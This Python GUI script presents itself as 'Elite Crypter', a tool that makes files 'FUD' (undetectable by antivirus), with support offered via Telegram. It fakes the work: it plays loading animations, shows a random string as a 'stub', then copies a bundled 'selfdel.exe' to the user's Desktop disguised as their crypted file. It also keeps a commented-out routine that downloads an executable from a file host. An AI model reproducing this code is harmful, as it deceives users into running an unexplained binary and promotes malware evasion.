import datetime
import os
import random
import string
import urllib.request
from pathlib import Path

import PySimpleGUI as sg
from PIL import Image

Timet = datetime.datetime.now() - datetime.timedelta(hours=2)
Timet = Timet.strftime("%H:%M:%S %p on %b %d %Y ")


def string_maker(length):  # define the function and pass the length as argument
    # Print the string in Lowercase
    result = ''.join((random.choice(string.ascii_letters)
                     for x in range(length)))  # run loop until the define length
    return result


def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)


Logo = resource_path("moon.ico")
Loading = resource_path("loading.gif")
selfdel = resource_path("selfdel.exe")
shield = resource_path("shield.png")
username = os.getlogin()

# def download(name, username):
# try:
# url = 'https://www.4sync.com/web/directDownload/v7KNFhH6/xuFVQ_U1.3e6dcdb8be2f8e4fc88a02c4f4757966'
# path = fr'C:\Users\{username}\Desktop\{name}.crypted.exe'
# urllib.request.urlretrieve(url, path)
# except:
# sg.popup('check file hosting')


def move(name, username):
    path = fr'C:\Users\{username}\Desktop\{name}.crypted.exe'
    try:
        os.rename(selfdel, path)
    except:
        sg.popup('error')


def clicked(name, username):
    try:
        move(name, username)
        sg.popup("File Saved to Desktop", no_titlebar=True)
    except:
        sg.popup("Check internet connection and try again")


sg.theme('Dark Grey 13')

col_center = [
  [sg.Text(visible=False, font='ANY 1', pad=(0, 0))], 
    [ sg.Image(shield, pad=((80, 1), 1)), sg.Text('Elite Crypter',  font=('Verdana', 25),justification="center" ,relief='raised', auto_size_text=True)],
      [sg.Text(visible=True, font='ANY 1', pad=(1, 0))], 
    [sg.Input(size=(41, 1), enable_events=True, key="-FILE-"),
     sg.FileBrowse(key="-IN-", size=(12, 1))],
    [sg.Input(size=(41, 1), key="-STUB-", enable_events=True, text_color='black',
              disabled=True), sg.Button('Download Stub',  size=(12, 1))],
    [sg.Button('Make it FUD!', button_color=(
        'white', 'green'), size=(50, 1)), ],
    [sg.Text(visible=False, font='ANY 1', pad=(0, 0))], 
    [sg.Text(visible=False, font='ANY 1', pad=(0, 0))], 
    [sg.Text("Support: telegram @victservice", font='ANY 8', pad=(130, (8, 0)),  justification="center" )], 
]

img_center = [
    
]

layout = [[sg.Text(key='-EXPAND-', font='ANY 1', pad=(0, 0))], 
          [sg.Text('', pad=(0, 0), key='-EXPAND2-'),
         
           sg.Column(col_center, vertical_alignment='center', justification='center',pad=(0,0), k='-C-')]]



# Create the window
window = sg.Window("FUD~Crypt", layout, size=(450, 220), icon=Logo,
                   element_justification='c', resizable=False, finalize=True)

# Event Loop to process "events"
while True:
    event, values = window.read()
    if event in (sg.WIN_CLOSED, 'Cancel'):
        break
    elif event == "Make it FUD!":
        # sg.popup("License is Suspended, please contact support for reactivation", no_titlebar=True)
        name = Path(os.path.basename(values["-IN-"])).stem
        stub = values["-STUB-"]
        if name and stub != "":
            for i in range(3000):
                sg.PopupAnimated(Loading, background_color=None,
                                 keep_on_top=True, alpha_channel=0.8,
                                 time_between_frames=40)
            sg.PopupAnimated(None)
            clicked(name, username)
        elif stub == '':
            sg.popup("Please Download Stub", no_titlebar=True)
        else:
            sg.Popup('Please select a file', no_titlebar=True)
    elif event == "Download Stub":
        for i in range(1600):
            sg.PopupAnimated(Loading, background_color=None,
                             keep_on_top=True, alpha_channel=0.8,
                             time_between_frames=40)
        sg.PopupAnimated(None)
        window['-STUB-'].update(string_maker(50))
        sg.popup(f"Stub Created at {Timet}", no_titlebar=True)
    # elif event == "Browse":
        # sg.popup("License is Suspended, please contact support for reactivation", no_titlebar=True)
    # elif event == "Download Stub":
        # sg.popup("License is Suspended, please contact support for reactivation", no_titlebar=True)


window.close()


# sg.FileBrowse(key="-IN-", size=(12, 1))],
